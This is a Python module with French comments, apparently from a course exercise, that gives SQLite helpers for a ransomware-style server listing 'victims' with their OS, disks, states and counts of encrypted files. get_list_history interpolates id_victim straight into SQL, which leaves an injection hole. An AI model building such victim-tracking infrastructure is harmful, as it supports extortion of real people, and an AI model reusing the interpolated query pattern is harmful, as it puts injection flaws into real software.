import sqlite3

# Constantes
DB_FILENAME = './data/victims.sqlite'


def connect_db():
    """
    Initialise la connexion vers la base de donnée
    :return: La connexion établie avec la base de donnée
    """
    try:
        # Establish a connection to the SQLite database
        conn = sqlite3.connect(DB_FILENAME)
        print("Connection successfully established.")
        return conn
    except sqlite3.Error as e:
        print(f"An error occurred while connecting to the database: {e}")


def insert_data(conn, table, items, data):
    """
    Insère des données de type 'items' avec les valeurs 'data' dans la 'table' en utilisant la connexion 'conn' existante
    :param conn: la connexion existante vers la base de donnée
    :param table: la table dans laquelle insérer les données
    :param items: le nom des champs à insérer
    :param data: la valeur des champs à insérer
    :return: Néant
    """
    # Construire l'instruction SQL INSERT INTO
    # Utilise un espace réservé '?' pour chaque donnée afin d'insérer les données de manière sécurisée
    sql = f"INSERT INTO {table} ({', '.join(items)}) VALUES ({', '.join(['?' for _ in data])})"

    try:
        # Créer un objet curseur en utilisant la connexion
        cur = conn.cursor()
        # Exécuter l'instruction INSERT INTO
        cur.execute(sql, data)
        # Valider la transaction
        conn.commit()
        print("Données insérées avec succès.")
    except sqlite3.Error as e:
        # Annuler la transaction en cas d'erreur
        conn.rollback()
        print(f"Une erreur s'est produite lors de l'insertion des données : {e}")


def select_data(conn, select_query):
    """
    Exécute un SELECT dans la base de donnée (conn) et retourne les records correspondants
    :param conn: la connexion déjà établie à la base de donnée
    :param select_query: la requête du select à effectuer
    :return: les records correspondants au résultats du SELECT
    """
    try:
        # Créer un objet curseur en utilisant la connexion
        cur = conn.cursor()
        # Exécuter la requête SELECT
        cur.execute(select_query)
        # Récupérer tous les résultats
        records = cur.fetchall()
        print("Requête exécutée avec succès.")
        return records
    except sqlite3.Error as e:
        print(f"Une erreur s'est produite lors de l'exécution de la requête SELECT : {e}")
        return None


def get_list_victims(conn):
    """
    Retourne la liste des victimes présente dans la base de donnée
    (N'oubliez pas de vous servir de la fonction précédente pour effectuer la requête)
    :param conn: la connexion déjà établie à la base de donnée
    :return: La liste des victimes
    """
    # Définir la requête SELECT pour récupérer les informations souhaitées sur les victimes
    # Par exemple, récupérer les noms des victimes depuis une table 'victims'
    select_query_victims = "SELECT v.id_victim,v.hash, v.os, v.disks, s.state, e.nb_files FROM victims v JOIN (SELECT id_victim, MAX(datetime) as max_datetime FROM states GROUP BY id_victim) latest_states ON v.id_victim = latest_states.id_victim JOIN states s ON v.id_victim = s.id_victim AND latest_states.max_datetime = s.datetime JOIN encrypted e ON v.id_victim = e.id_victim ORDER BY v.id_victim ASC;"

    # Utiliser la fonction select_data pour exécuter la requête
    victims_records = select_data(conn, select_query_victims)


    if victims_records is not None:
        print("Liste des victimes récupérée avec succès.")
        return victims_records
    else:
        print("Impossible de récupérer la liste des victimes.")
        return []



def get_list_history(conn, id_victim):
    """
    Retourne l'historique correspondant à la victime 'id_victim'
    :param conn: la connexion déjà établie à la base de donnée
    :param id_victim: l'identifiant de la victime
    :return: la liste de son historique
    """
    # Définir la requête SELECT pour récupérer l'historique de la victime spécifiée
    # Assurez-vous que la table et les colonnes correspondent à votre schéma de base de données
    # Par exemple, récupérer des informations depuis une table 'history' où 'victim_id' correspond à id_victim
    select_query_history = f"SELECT * FROM states WHERE id_victim = {id_victim};"

    # Utiliser la fonction select_data pour exécuter la requête
    history_records = select_data(conn, select_query_history)

    if history_records is not None:
        print("Historique récupéré avec succès😀.")
        return history_records
    else:
        print("Impossible de récupérer l'historique.")
        return []







